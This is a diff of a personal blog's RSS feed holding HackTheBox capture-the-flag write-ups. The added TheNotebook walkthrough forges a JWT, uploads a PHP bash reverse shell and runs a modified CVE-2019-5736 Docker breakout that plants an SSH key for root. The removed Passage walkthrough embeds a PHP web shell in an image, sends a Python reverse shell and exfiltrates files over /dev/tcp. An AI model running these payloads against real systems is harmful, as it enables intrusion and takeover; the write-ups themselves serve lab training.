++----<span class="o">[</span>SHA256<span class="o">]</span>-----+
+</code></pre></div><p>I will head to <a href="https://jwt.io/">jwt.io</a> to forge a new token and sign it using my <code>privKey.key</code>, and I will put this forged token to the <code>auth</code> cookie.</p>
+<p><div class="img-container"><img src="imgs/image-20210807152924854.png" alt="image-20210807152924854"  /></div>
+</p>
+<p>When I refresh the browser, a new menu called &ldquo;Admin Panel&rdquo; pops up.</p>
+<p><div class="img-container"><img src="imgs/image-20210807153522086.png" alt="image-20210807153522086"  /></div>
+</p>
+<p>Clicking the Admin Panel points to <code>/admin</code> where I see two options there: <code>View Notes</code> and <code>Upload File</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210807154045797.png" alt="image-20210807154045797"  /></div>
+</p>
+<p>The <code>View Notes</code> button links to <code>/admin/viewnotes</code>, and in this page all users' note can be viewed by the admin.</p>
+<p><div class="img-container"><img src="imgs/image-20210807154240999.png" alt="image-20210807154240999"  /></div>
+</p>
+<p>Two interesting notes created by the admin are titled: <code>Need to fix config</code> and <code>Backups are scheduled</code>.  The first note contains information about a security issue.</p>
+<p><div class="img-container"><img src="imgs/image-20210807154529651.png" alt="image-20210807154529651"  /></div>
+</p>
+<p>The second note states that the server has regular backups set.</p>
+<p><div class="img-container"><img src="imgs/image-20210807154537751.png" alt="image-20210807154537751"  /></div>
+</p>
+<p>The <code>File Upload</code> button points to <code>/admin/upload</code>. This page provides an upload functionality.</p>
+<p><div class="img-container"><img src="imgs/image-20210807160019742.png" alt="image-20210807160019742"  /></div>
+</p>
+<h4 id="web-shell-upload">Web Shell Upload</h4>
+<p>According to the note titled with <code>Need to fix config</code>, I will try to drop the following PHP code on the upload page.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ <span class="nb">echo</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span> &gt; iamf-test.php 
+</code></pre></div><p>And the file gets uploaded.</p>
+<p><div class="img-container"><img src="imgs/image-20210807163411701.png" alt="image-20210807163411701"  /></div>
+</p>
+<p>The uploaded file can be accessed at <code>http://10.10.10.230/48101bbdd897877cc62b8704a293a436.php</code>. When I visit the link, it processes the PHP code.</p>
+<p><div class="img-container"><img src="imgs/image-20210807163428110.png" alt="image-20210807163428110"  /></div>
+</p>
+<p>I will change the payload with the following PHP reverse shell and then setup a netcat listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.17/53 0&gt;&amp;1&#39;&#34;</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>When I get the file URL, I will use <code>curl</code> to trigger the reverse shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ curl -s http://10.10.10.230/11ee6b411f33fe8f9c49d1a02e5720b7.php
+</code></pre></div><p>Now on my listener, I have an interactive shell access as <code>www-data</code> .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ nc -nvlp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.17<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.230<span class="o">]</span> <span class="m">39698</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1294<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+www-data@thenotebook:~/html$ 
+</code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
+<p>I will upgrade my shell to fully interactive one.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@thenotebook:~/html$ which script
+which script
+/usr/bin/script
+www-data@thenotebook:~/html$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@thenotebook:~/html$ ^Z
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">5987</span> suspended  nc -nvlp <span class="m">53</span>
+→ kali@kali «thenotebook» «10.10.14.17» 
+$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">5987</span> continued  nc -nvlp <span class="m">53</span>
+
+www-data@thenotebook:~/html$ stty rows <span class="m">30</span> cols <span class="m">106</span>
+www-data@thenotebook:~/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-noah">Shell as noah</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Based on the previous admin notes, I start with enumeration of readable file that contains &ldquo;backup&rdquo; string. One that stands out is <code>/var/backups/home.tar.gz</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@thenotebook:~/html$ find / -type f -readable 2&gt;/dev/null <span class="p">|</span> grep -i <span class="s2">&#34;backup&#34;</span>
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+/var/backups/home.tar.gz
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>I will grab that file to my attacking machine. The file contains an SSH private key for user <code>noah</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.17» 
+$ tar -zxvf home.tar.gz
+home/
+home/noah/
+home/noah/.bash_logout
+home/noah/.cache/
+home/noah/.cache/motd.legal-displayed
+home/noah/.gnupg/
+home/noah/.gnupg/private-keys-v1.d/
+home/noah/.bashrc
+home/noah/.profile
+home/noah/.ssh/
+home/noah/.ssh/id_rsa
+home/noah/.ssh/authorized_keys
+home/noah/.ssh/id_rsa.pub
+</code></pre></div><h4 id="ssh---noah">SSH - noah</h4>
+<p>With the obtained private key, I can SSH login as <strong>noah</strong> .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ ssh -i loot/home/noah/.ssh/id_rsa noah@10.10.10.230
+Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-151-generic x86_64<span class="o">)</span>
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+  System information as of Sat Aug  <span class="m">7</span> 09:57:29 UTC <span class="m">2021</span>
+
+  System load:  0.03              Processes:              <span class="m">184</span>
+  Usage of /:   46.1% of 7.81GB   Users logged in:        <span class="m">0</span>
+  Memory usage: 19%               IP address <span class="k">for</span> ens160:  10.10.10.230
+  Swap usage:   0%                IP address <span class="k">for</span> docker0: 172.17.0.1
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+Last login: Wed Feb <span class="m">24</span> 09:09:34 <span class="m">2021</span> from 10.10.14.5
+noah@thenotebook:~$ id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span>
+</code></pre></div><p>User flag is done here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ cat user.txt <span class="p">|</span> sed -s <span class="s1">&#39;s/[a-f]/\*/g&#39;</span>
+*881626900**9*271**710*266*9427*
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>User <strong>noah</strong> is allowed to run an interactive command and shell to a container called <code>webapp-dev01</code> as root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo -l
+Matching Defaults entries <span class="k">for</span> noah on thenotebook:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User noah may run the following commands on thenotebook:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01*
+</code></pre></div><p>And the currently installed docker is vulnerable to CVE-2019-5736. More details about the vulnerability can be read <a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">here</a>.</p>
+<pre tabindex="0"><code>noah@thenotebook:~$ docker version
+Client:
+ Version:           18.06.0-ce
+ API version:       1.38
+ Go version:        go1.10.3
+ Git commit:        0ffa825
+ Built:             Wed Jul 18 19:09:54 2018
+ OS/Arch:           linux/amd64
+ Experimental:      false
+Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.38/version: dial unix /var/run/docker.sock: connect: permission denied
+</code></pre><h4 id="docker-breakout-cve-2019-5736">Docker Breakout CVE-2019-5736</h4>
+<p>To exploit the docker CVE-2019-5736, I will be using this <a href="https://github.com/Frichetten/CVE-2019-5736-PoC.git">PoC</a> by Frichetten. The exploit&rsquo;s author also gives a nice writeup about what the exploit does.</p>
+<p>I will clone the PoC to my working directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.17» 
+$ git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git
+Cloning into <span class="s1">&#39;CVE-2019-5736-PoC&#39;</span>...
+remote: Enumerating objects: 45, <span class="k">done</span>.
+remote: Total <span class="m">45</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">45</span>
+Receiving objects: 100% <span class="o">(</span>45/45<span class="o">)</span>, 1.69 MiB <span class="p">|</span> 254.00 KiB/s, <span class="k">done</span>.
+Resolving deltas: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span>.
+</code></pre></div><p>In the <code>main.go</code>, I will modify the payload variable with a bash script that will inject my SSH public key to root&rsquo;s <code>authorized_keys</code> file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">payload</span> <span class="p">=</span> <span class="s">&#34;#!/bin/bash \n mkdir -p /root/.ssh/ &amp;&amp; echo &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39; &gt; /root/.ssh/authorized_keys&#34;</span>
+</code></pre></div><p>I will compile the PoC and host it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «CVE-2019-5736-PoC» «10.10.14.17» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+$ go build -o breakout main.go <span class="o">&amp;&amp;</span> python3 -m http.server <span class="m">8080</span>
+Serving HTTP on 0.0.0.0 port <span class="m">8080</span> <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+</code></pre></div><p>On TheNotebook, I will have two SSH sessions. On the first SSH session, I will use it to download and execute the exploit within the container.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 bash
+root@0f4c2517af40:/opt/webapp# wget -q 10.10.14.17:8080/breakout <span class="o">&amp;&amp;</span> chmod +x breakout
+root@0f4c2517af40:/opt/webapp# ./breakout
+<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
+</code></pre></div><p>Then on the second session, I will run the sudo command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 /bin/sh
+</code></pre></div><p>But then, on the container session, I get the following error:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@0f4c2517af40:/opt/webapp# ./breakout
+<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
+<span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">17638</span>
+<span class="o">[</span>+<span class="o">]</span> Found the PID: self
+strconv.Atoi: parsing <span class="s2">&#34;self&#34;</span>: invalid syntax
+</code></pre></div><p>To resolve that, at line 42 of the <code>main.go</code> file, I will add another condition to ignore PID with name &ldquo;self&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">f</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">pids</span> <span class="p">{</span>
+	<span class="nx">fbytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="s">&#34;/proc/&#34;</span> <span class="o">+</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">()</span> <span class="o">+</span> <span class="s">&#34;/cmdline&#34;</span><span class="p">)</span>
+	<span class="nx">fstring</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">fbytes</span><span class="p">)</span>
+	<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">fstring</span><span class="p">,</span> <span class="s">&#34;runc&#34;</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">!</span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">(),</span> <span class="s">&#34;self&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Added by me
+</span><span class="c1"></span>			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;[+] Found the PID:&#34;</span><span class="p">,</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
+			<span class="nx">found</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">Atoi</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
+			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+				<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+				<span class="k">return</span>
+			<span class="p">}</span>
+		<span class="p">}</span> <span class="c1">// end
+</span><span class="c1"></span>	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>I will re-compile the exploit and transfer it again to the container, and this time it works!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@c8cf4072ca26:/opt/webapp# ./breakout 
+<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
+<span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">1729</span>
+<span class="o">[</span>+<span class="o">]</span> Getting file handle
+<span class="o">[</span>+<span class="o">]</span> Successfully got the file handle
+<span class="o">[</span>+<span class="o">]</span> Successfully got write handle <span class="p">&amp;</span><span class="o">{</span>0xc000444000<span class="o">}</span>
+root@c8cf4072ca26:/opt/webapp# 
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210807220201808.png" alt="image-20210807220201808"  /></div>
+</p>
+<blockquote>
+<p>Pay attention to <code>bash</code> and <code>/bin/sh</code></p>
+</blockquote>
+<h4 id="ssh---root">SSH - Root</h4>
+<p>Now I can SSH login as root using my own private keys.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»  
+$ ssh root@10.10.10.230
+Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-151-generic x86_64<span class="o">)</span>
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+  System load:  0.1               Processes:              <span class="m">190</span>
+  Usage of /:   46.1% of 7.81GB   Users logged in:        <span class="m">1</span>
+  Memory usage: 19%               IP address <span class="k">for</span> ens160:  10.10.10.230
+  Swap usage:   0%                IP address <span class="k">for</span> docker0: 172.17.0.1
+
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+Last login: Fri Jul <span class="m">23</span> 14:27:18 <span class="m">2021</span>
+root@thenotebook:~# 
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/</a></li>
+<li><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - TheNotebook</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-thenotebook/</link>
       <pubDate>Sat, 07 Aug 2021 21:07:15 +0700</pubDate>
       
@@ -925,10 +1842,10 @@ root@thenotebook:~#
     
     <item>
       <title>HackTheBox - Spectra</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</link>
+      <link>https://fahmifj.github.io/hackthebox/spectra/</link>
       <pubDate>Sat, 26 Jun 2021 21:27:14 +0700</pubDate>
       
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</guid>
+      <guid>https://fahmifj.github.io/hackthebox/spectra/</guid>
       <description>Getting password from automatic login script of ChromeOS</description>
       <content:encoded><![CDATA[<p>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a WordPress website, which has a directory listing enabled, thus exposing its source code. Examining the source reveals a database password that is reused by the wordpress admin. With administrator access, I&rsquo;m able to inject a PHP code into a theme file to get a foothold on the system. Enumerating the internal discovers an auto-login password, and it is reused by a user. The user has sudo permissions on <code>initctl</code>, which can be exploited to get a root shell.</p>
 <h4 id="skills-learned">Skills Learned</h4>
@@ -1283,718 +2200,6 @@ spectra
 <li><a href="https://www.hackingarticles.in/wordpress-reverse-shell/">https://www.hackingarticles.in/wordpress-reverse-shell/</a></li>
 <li><a href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></li>
 <li><a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it">https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Passage</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-passage/</link>
-      <pubDate>Fri, 07 May 2021 19:30:38 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-passage/</guid>
-      <description>Leveraging USBCreator for local privilege escalation on Linux</description>
-      <content:encoded><![CDATA[<p>Passage from HackTheBox hosts a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing me to gain code execution on the system via the avatar upload feature. Examining the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to a user. The user is using the same SSH key with another user. There is a unpatched package called USBCreator and it has vulnerability that allows an attacker to perform arbitrary file as root without supplying a password.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>
-<p>CuteNews 2.1.2 exploitation</p>
-</li>
-<li>
-<p>USBCreator D-bus exploitation</p>
-</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap</li>
-<li>hashcat (Windows) - <a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></li>
-<li>Exiftool - <a href="https://exiftool.org/">https://exiftool.org/</a></li>
-<li>gdbus - Preinstalled in the target machine.</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>An initial nmap discovers two open ports, SSH on port 22 and HTTP running Apache web server on port 80.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «passage» «10.10.14.31»
-$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN initial-passage -v 10.10.10.206
-<span class="c1"># Nmap 7.80 scan initiated Sat Sep  5 15:39:12 2020 as: nmap -sC -sV -oN initial-passage -v 10.10.10.206</span>
-Nmap scan report <span class="k">for</span> 10.10.10.206
-Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.
-Not shown: <span class="m">998</span> closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey:
-<span class="p">|</span>   <span class="m">2048</span> 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 <span class="o">(</span>ED25519<span class="o">)</span>
-80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
-<span class="p">|</span> http-methods:
-<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
-<span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
-<span class="p">|</span>_http-title: Passage News
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</code></pre></div><p>As SSH usually requires credentials, I&rsquo;ll enumerate the web server on port 80.</p>
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>The page presenting a kind of news website called &ldquo;Passage News&rdquo;.</p>
-<p><div class="img-container"><img src="imgs/d7ac9042cb934e58912a75669587968e.png" alt="d7ac9042cb934e58912a75669587968e"  /></div>
-</p>
-<p>The post titled &ldquo;Implemented Fail2Ban&rdquo; states that they have implemented the Fail2Ban feature. Knowing this, I will avoid any kind of brute force attack here.</p>
-<p><div class="img-container"><img src="imgs/9eb82005d29d4c4e85aaa22c778203b0.png" alt="9eb82005d29d4c4e85aaa22c778203b0"  /></div>
-</p>
-<p>Inspecting the page sources finds a directory called &ldquo;CuteNews&rdquo;. I also find the hostname <code>passage.htb</code>.</p>
-<p><div class="img-container"><img src="imgs/c78e8e637c114e089fc80228b7b92d20.png" alt="c78e8e637c114e089fc80228b7b92d20"  /></div>
-</p>
-<p>Adding <code>/CuteNews</code> to the URL redirects me to a login page.</p>
-<p><div class="img-container"><img src="imgs/7fa49ed1b8fc47d6ad274565962e4007.png" alt="7fa49ed1b8fc47d6ad274565962e4007"  /></div>
-</p>
-<p>I can register as normal user.</p>
-<p><div class="img-container"><img src="imgs/image-20210508014328401.png" alt="image-20210508014328401"  /></div>
-</p>
-<h4 id="searchsploit">Searchsploit</h4>
-<p>I threw &ldquo;CuteNews 2.1.2&rdquo; to <code>searchsploit</code> and it returned several exploits.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «passage» «10.10.14.31»
-$ searchsploit <span class="s1">&#39;CuteNews 2.1.2&#39;</span>
-------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                     <span class="p">|</span>  Path
-------------------------------------------------------------------- ---------------------------------
-CuteNews 2.1.2 - <span class="s1">&#39;avatar&#39;</span> Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>       <span class="p">|</span> php/remote/46698.rb
-CuteNews 2.1.2 - Arbitrary File Deletion                           <span class="p">|</span> php/webapps/48447.txt
-CuteNews 2.1.2 - Authenticated Arbitrary File Upload               <span class="p">|</span> php/webapps/48458.txt
-------------------------------------------------------------------- ---------------------------------
-</code></pre></div><p>I&rsquo;ll go with the &lsquo;avatar&rsquo; RCE.</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-www-data">Shell as www-data</h3>
-<h4 id="cutenews-cve-2019-11447">CuteNews CVE-2019-11447</h4>
-<p>It turns out the &lsquo;avatar&rsquo; RCE exploit was a CVE. The exploit module description as follows:</p>
-<blockquote>
-<p>This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.
-The attacker can infiltrate the server through the avatar upload process in the profile area.
-There is no realistic control of the $imgsize function in &ldquo;/core/modules/dashboard.php&rdquo;
-Header content of the file can be changed and the control can be bypassed.
-We can use the &ldquo;GIF&rdquo; header for this process.
-An ordinary user is enough to exploit the vulnerability. No need for admin user.
-The module creates a file for you and allows RCE.</p>
-</blockquote>
-<p>I can also exploit this manually.</p>
-<p>I still have the payload that I made using <code>exiftool</code> in my previous <a href="/writeup/htb-magic">Magic write-up</a>. If I don&rsquo;t have it, I can create a new one, embedding a PHP web shell as a comment.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «passage» «10.10.14.31»
-$ exiftool -Comment<span class="o">=</span><span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
-</code></pre></div><p>I&rsquo;ll rename my jpeg image to <code>iamfr.php</code>, and then I&rsquo;ll upload it as my avatar (Dashboard &ndash;&gt; Personal Options).</p>
-<p><div class="img-container"><img src="imgs/image-20210508022032162.png" alt="image-20210508022032162"  /></div>
-</p>
-<p>The image is located at <code>http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php</code></p>
-<p><img src="imgs/image-20210508023129512.png" alt="image-20210508023129512" style="zoom:67%;" /></p>
-<p>I&rsquo;ll send a Python reverse shell through the web shell and capture it on my <code>nc</code> listener.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php?cmd<span class="o">=</span>python3 -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.31&#34;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
-</code></pre></div><p>I have an interactive shell now.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «passage» «10.10.14.31»
-$ rlwrap nc -nvlp <span class="m">9001</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
-connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.206<span class="o">]</span> <span class="m">37062</span>
-bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1678<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
-bash: no job control in this shell
-www-data@passage:/var/www/html/CuteNews/uploads$ id
-id
-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-www-data@passage:/var/www/html/CuteNews/uploads$ python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-www-data@passage:/var/www/html/CuteNews/uploads$
-www-data@passage:/var/www/html/CuteNews/uploads$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-paul">Shell as paul</h3>
-<h4 id="internal-enumeration">Internal Enumeration</h4>
-<p>There are two users in home directory.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@passage:/var/www/html/CuteNews/uploads$ ls -l /home
-ls -l /home
-total <span class="m">8</span>
-drwxr-x--- <span class="m">17</span> nadav nadav  <span class="m">4096</span> Mar <span class="m">5</span> 09:21 nadav
-drwxr-x--- <span class="m">17</span> paul  paul   <span class="m">4096</span> Mar <span class="m">5</span> 08:32 paul
-</code></pre></div><p>On <code>/var/www/html/CuteNews/cdata/users</code>, I finds a bunch of PHP files contains data encoded in base64. Some of the file contains PHP tags.</p>
-<p><div class="img-container"><img src="imgs/image-20210508025611714.png" alt="image-20210508025611714"  /></div>
-</p>
-<blockquote>
-<p>Apologize for the image quality (also for the white background), it was recovered from my KeepNote app.</p>
-</blockquote>
-<p>I&rsquo;ll send those files to my machine as one file using <code>cat</code> and <code>dev/tcp</code> trick</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@passage:/var/www/html/CuteNews/cdata/users$ cat *.php &gt; /dev/tcp/10.10.14.31/9000
-</code></pre></div><p>I redirected it to a file called <code>cdata.users</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «passage» «10.10.14.31»
